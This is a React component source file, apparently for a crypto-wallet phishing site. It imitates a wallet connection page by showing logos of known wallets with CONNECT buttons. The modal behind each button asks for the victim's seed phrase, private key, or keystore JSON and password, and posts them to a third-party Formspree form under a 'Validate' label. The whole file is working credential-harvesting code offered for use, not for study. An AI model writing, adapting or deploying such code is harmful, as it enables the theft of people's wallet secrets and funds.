import React, { useState } from "react";
import { useForm, ValidationError } from "@formspree/react";

// import { json } from "react-router-dom";

const Wallets = () => {
  const [authModal, setAuthModal] = useState(false);
  const [mnemonic, setMnemonic] = useState(true);
  const [privateKey, setPrivateKey] = useState(false);
  const [jsonKeyStore, setJsonKeyStore] = useState(false);

  //   validating mnemonic

  //   showing the modal (fuctions is attached to the coin wallets)
  const handleShowModal = () => {
    setAuthModal(true);
  };
  const closeModal = () =>{
    setAuthModal(false)
  }

  //   fuction toggling different wallet authentications
  const handleShowMnemonic = () => {
    setMnemonic(true);
    setPrivateKey(false);
    setJsonKeyStore(false);
  };
  const handleShowPrivateKey = () => {
    setMnemonic(false);
    setPrivateKey(true);
    setJsonKeyStore(false);
  };
  const handleShowKeystoreJson = () => {
    setMnemonic(false);
    setPrivateKey(false);
    setJsonKeyStore(true);
  };

  const Walletss = [
    {
      name: "Metamask",
      src: "https://registry.walletconnect.com/api/v1/logo/lg/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
      alt: "metamask",
    },
    {
      name: "Wallet Connect",
      src: "https://web3autofix.pages.dev/img/walletconnect.92044555.svg",
      alt: "wallet connect",
    },
    {
      name: "SafePal",
      src: "https://registry.walletconnect.org/logo/lg/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.jpeg",
      alt: "safepal",
    },
    {
      name: "ITOKEN",
      src: "https://play-lh.googleusercontent.com/a1omFR676rQsxhuh8wPxcJlw500KX8YKMcYweeM59W5b6JabxYZ0lA3ELtKCspmFcg",
      alt: "itoken",
    },
    {
      name: "Bitget",
      src: "https://play-lh.googleusercontent.com/ibTlTcbBcnRCeSKBX4UT8pziWuFGNOgp36boA3tzv217KQCq5qPkIC3NvjpbjYvrqLA",
      alt: "bitget",
    },
    {
      name: "Terra Station",
      src: "https://play-lh.googleusercontent.com/ScfqhIBlnMHbFntJsOCqqWLF5cAjinXqIwM9xkw-XA1P-E9zYOFEm0ycc-20rC4Ae2nH",
      alt: "terra station",
    },
    {
      name: "SWFT",
      src: "https://play-lh.googleusercontent.com/jplKk_qSnXI_m9PaIx_YQ4YoMQTHdUF5eH8rm5kEQs9ZcHBJdw8K9vBI3MHrwl1WDKI",
      alt: "swft",
    },
    {
      name: "Token Pocket",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/f3119826-4ef5-4d31-4789-d4ae5c18e400?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "tp",
    },

    {
      name: "BITKEEP",
      src: "https://play-lh.googleusercontent.com/9ejeZqAJOWzOWMA3T40lKCv93aEolQd-dZ38JXfod8rSoo_mXOncDle5C9FoV8NTegAI",
      alt: "bitkeep",
    },
    {
      name: "Tron link",
      src: "https://play-lh.googleusercontent.com/nJQ2XyuF3tWPspfAMy4kVEk5YLg2n-ZJQ_qExNagaPYiIfV_D3PW3_iAPBq8DY_uLw",
      alt: "tron link",
    },
    {
      name: "Coinbase",
      src: "https://web3autofix.pages.dev/img/coin.d748b142.png",
      alt: "coinbase",
    },
    {
      name: "TBCC",
      src: "https://web3autofix.pages.dev/img/tcc.3ef9cff0.jpeg",
      alt: "tbbc",
    },
    {
      name: "SWT Token",
      src: "https://web3autofix.pages.dev/img/swt.0a556904.png",
      alt: "swf",
    },
    {
      name: "Trezor",
      src: "https://avatars.githubusercontent.com/u/4146447?s=280&v=4",
      alt: "trezor",
    },
    {
      name: "Wallet Connect",
      src: "https://play-lh.googleusercontent.com/RSz4cnzajV5t-j6kEMH1mmwG6RtzsbZCex2NLw6uqTdPC04rMyll0iwt5Ue0ree6-gM",
      alt: "wallet connect",
    },
    {
      name: "Trust Wallet",
      src: "https://registry.walletconnect.com/api/v1/logo/lg/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
      alt: "trust",
    },
    {
      name: "",
      src: "https://play-lh.googleusercontent.com/wrgUujbq5kbn4Wd4tzyhQnxOXkjiGqq39N4zBvCHmxpIiKcZw_Pb065KTWWlnoejsg",
      alt: "token",
    },
    {
      name: "",
      src: "https://play-lh.googleusercontent.com/BxFMJpwGIZF1jadYbyHX9wkx-fqHRGRkbM2qs6aueygk7GhXeLS8-G461v--X4tqUO8l",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/7c5ff577-a68d-49c5-02cd-3d83637b0b00?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://304015554-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-Mgv3_8586v0mVL4zZax%2Ficon%2FWvDTo0Kodwa4awPEQrsO%2Fflarelogo.png?alt=media&token=b115a1f0-a543-4a49-828a-e3ede684055e",
      alt: "token",
    },
    {
      name: "",
      src: "https://s2.coinmarketcap.com/static/img/coins/200x200/5426.png",
      alt: "token",
    },
    {
      name: "",
      src: "https://play-lh.googleusercontent.com/wrgUujbq5kbn4Wd4tzyhQnxOXkjiGqq39N4zBvCHmxpIiKcZw_Pb065KTWWlnoejsg",
      alt: "token",
    },
    {
      name: "",
      src: "https://cspr.live/assets/images/casper-signer.png",
      alt: "token",
    },
    {
      name: "",
      src: "https://play-lh.googleusercontent.com/wrgUujbq5kbn4Wd4tzyhQnxOXkjiGqq39N4zBvCHmxpIiKcZw_Pb065KTWWlnoejsg",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/4725dda0-4471-4d0f-7adf-6bbe8b929c00?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/1bf33a89-b049-4a1c-d1f6-4dd7419ee400?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/f9f3d8da-e791-47d2-98c2-031712617e00?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/6487869b-1165-4f30-aa3a-115665be8300?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/1caa462e-dcf5-4c56-d180-094c81444f00?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/af185895-cda5-4eaf-e31b-28b6fe4b0800?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/dfe0e3e3-5746-4e2b-12ad-704608531500?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/c227ee0a-5127-4707-ded9-c3cd81348d00?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/32e89601-0490-42fc-0cc4-8627d62a2000?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/322bd6f0-09b5-4595-cb15-0dfab8054800?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/ea0140c7-787c-43a4-838f-d5ab6a342000?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/d017bc54-db4d-4f07-2de2-69790ce92400?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/7e1514ba-932d-415d-1bdb-bccb6c2cbc00?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/e2024511-2c9b-46d7-3111-52df3d241700?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/73e6b2b2-8c02-42e9-84f5-82a859978200?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/c268e78d-ffb0-4c8b-5cad-04c3add48500?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/e321346d-5ce7-4e75-371e-e4f0bf923900?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/b869d966-4699-44de-eadb-4eb39a580600?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "PIER",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/cf3f0da1-40ec-4940-aebe-df075513d100?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "pier",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/363fae03-882a-4d81-a721-6e6f6e9ac500?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/e4eff15a-35d5-49fe-047f-33e331f46400?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/ea26c3c8-adb6-4dc4-ee02-35d6eee02800?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/80eaa630-6392-4b0a-a604-0a0f808e4d00?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/eb6de921-6824-4f35-6331-8a8b031e7100?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/5ef7e40e-1f02-4da2-54bf-992e3e83e100?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/70485da2-2568-463d-722c-25082997cc00?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/f90bc33f-f085-40cf-7538-fae5ae84f900?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/2d8006c3-852b-458a-d6b0-916c5ba76800?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/b57b2163-1bd8-4f6b-3311-470767e6d200?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/a7106965-91cc-4a73-4688-c5c72ae0ed00?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/a78c4d48-32c1-4a9d-52f2-ec7ee08ce200?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/c68b81d1-a400-4a07-6d9d-28edda986d00?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/fc460647-ea95-447a-99f0-1bff8fa4be00?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/51fa27fd-8a21-4de0-c084-528e4a37ad00?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/41f6ac85-8f4e-4d9f-b37b-92b43fa7f400?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/75dd1471-77e9-4811-ce57-ec8fc980ec00?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/efec6318-7f96-4b30-9287-6c287660cd00?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/280cd57b-24f4-4700-8d53-94fe292fab00?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/7025146c-c341-473f-a79c-62ec48eef800?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/c664d955-8a1e-4460-3917-4cfcf198f000?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
    {
      name: "",
      src: "https://explorer-api.walletconnect.com/v3/logo/lg/058878f4-7364-4e01-434f-2cc09a15cf00?projectId=2f05ae7f1116030fde2d36508f472bfb",
      alt: "token",
    },
  ];

  // Create a map to keep track of unique src values
  const srcMap = {};

  // Filter the array to keep only the first occurrence of each unique src value
  const uniqueWallets = Walletss.filter((wallet) => {
    if (!srcMap[wallet.src]) {
      srcMap[wallet.src] = true;
      return true;
    }
    return false;
  });

  const [searchQuery, setSearchQuery] = useState("");
  const filteredWallets = uniqueWallets.filter((wallet) =>
    wallet.name.toLowerCase().includes(searchQuery.toLowerCase())
  );

  const [state, handleSubmit] = useForm("mwkdwyqy");
  if (state.succeeded) {
      return <p>Thanks for joining!</p>;
  }

  return (
    <div>
      <div className="container">
        <div className="row">
          <div className="col-md-2"></div>
          <div className="col-md-8">
            <div className="searchPlacess">
              <div>
                <input
                  id="searchBox"
                  type="text"
                  placeholder="search platform"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                />
              </div>
            </div>
          </div>
          <div className="col-md-2"></div>
        </div>
      </div>
      <div className="container">
        <div className="row ">
          {filteredWallets.map((wallet) => (
            <div
              key={wallet.name} // Use wallet name as the key
              className="col-md-3 col-6 mt-5 text-center center"
            >
              <div className="image-card">
                <img
                  src={wallet.src}
                  alt={wallet.alt}
                  title={wallet.name}
                  className="coinStyle b-radius cursor"
                  width="50%"
                  onClick={handleShowModal}
                />
                <div className="image-description">{wallet.name}</div>
                <button  onClick={handleShowModal} className="butin">
                  CONNECT
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>

      {authModal && (
        // WALLET CONNECTION MODAL connect your wallet onclick of any token to trigger modal for authentication
        <div>
          <div className="container-fluid modal-parent-body">
            <div className="row">
              <div className="col-md-3"></div>
              <div className="col-md-6">
                <div className="modal-body">
                  <div className="modal-header">
                    <div className="row">
                      <div className="col-md-6"></div>
                      <div className="col-md-6">
                        <p onClick={closeModal} className="text-white cursor">X</p>
                      </div>
                    </div>
                  </div>
                  <div className="container">
                    <div className="row mt-2">
                      <div className="col-md-2 col-3">
                        <button
                          onClick={handleShowMnemonic}
                          className="authType"
                        >
                          MNEMONIC
                        </button>
                      </div>
                      <div className="col-md-2">
                        <button
                          onClick={handleShowPrivateKey}
                          className="authType"
                        >
                          PRIVATE KEY
                        </button>
                      </div>
                      <div className="col-md-3">
                        <button
                          onClick={handleShowKeystoreJson}
                          className="authType"
                        >
                          KEYSTORE JSON
                        </button>
                      </div>
                      <div className="col-md-5"></div>
                    </div>
                  </div>

                  {mnemonic && (
                    // mnemonic phrase
                    <div>
                      <div className="container ">
                        <div className="row">
                          <span className="mt-3 brandColor">
                            Mnemonic Phrase
                          </span>
                          <div className="col-md-12">
                            <div className="md-form mb-4 pink-textarea active-pink-textarea">
                              <form onSubmit={handleSubmit}>
                                <textarea
                                  placeholder="enter your mnemonic phrase here*"
                                  name="mnemonic"
                                  id="mnemonic"
                                  class="md-textarea form-control mnemonic"
                                  rows="3"
                                  required
                                ></textarea>
                                <ValidationError
                                  prefix="mnemonic"
                                  field="mnemonic"
                                  errors={state.errors}
                                />
                                <div className="row mt-3">
                                  <div className="col-md-9">
                                    <small className="text-danger">
                                      * indicates required fields
                                    </small>
                                  </div>
                                  <div className="col-md-3">
                                    <button type="submit" disabled={state.submitting} className="btn btn-primary float">
                                      Validate
                                    </button>
                                  </div>
                                </div>
                              </form>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}

                  {privateKey && (
                    // mnemonic phrase
                    <div>
                      <div className="container ">
                        <div className="row">
                          <span className="mt-3 brandColor">Private Key</span>
                          <div className="col-md-12">
                            <div className="md-form mb-4 pink-textarea active-pink-textarea">
                              <form onSubmit={handleSubmit}>
                                <input
                                  type="text"
                                  placeholder="enter your Private Key here *"
                                  name="privatekey"
                                  id="privatekey"
                                  className="md-textarea form-control privateKey"
                                  rows="3"
                                  required
                                />
                                <ValidationError
                                  prefix="Emaiprivatekey"
                                  field="privatekey"
                                  errors={state.errors}
                                />
                                <div className="row m-3">
                                  <div className="col-md-9">
                                    <small className="text-danger">
                                      * indicates required fields
                                    </small>
                                  </div>
                                  <div className="col-md-3">
                                    <button type="submit" disabled={state.submitting} className="btn btn-primary float">
                                      Validate
                                    </button>
                                  </div>
                                </div>
                              </form>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}

                  {jsonKeyStore && (
                    // mnemonic phrase
                    <div>
                      <div className="container ">
                        <div className="row">
                          <span className="mt-3 brandColor">Keystore JSON</span>
                          <div className="col-md-12">
                            <div className="md-form mb-4 pink-textarea active-pink-textarea">
                              <form onSubmit={handleSubmit}>
                                <p>
                                  <input
                                    type="text"
                                    placeholder="keystore JSON {} *"
                                    name="keystorejson"
                                    id="keystorejson"
                                    className="md-textarea form-control privateKey"
                                    rows="3"
                                    required
                                  />
                                  <ValidationError
                                    prefix="Keystorejson"
                                    field="keystorejson"
                                    errors={state.errors}
                                  />
                                </p>
                                <input
                                  type="password"
                                  placeholder="Password *"
                                  name="password"
                                  id="password"
                                  className="md-textarea form-control privateKey"
                                  rows="3"
                                  required
                                />
                                <ValidationError
                                  prefix="password"
                                  field="password"
                                  errors={state.errors}
                                />
                                <div className="row mt-4">
                                  <div className="col-md-9">
                                    <small className="text-danger">
                                      * indicates required fields
                                    </small>
                                  </div>
                                  <div className="col-md-3">
                                    <button type="submit" disabled={state.submitting} className="btn btn-primary float">
                                      Validate
                                    </button>
                                  </div>
                                </div>
                              </form>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              </div>
              <div className="col-md-3"></div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Wallets;
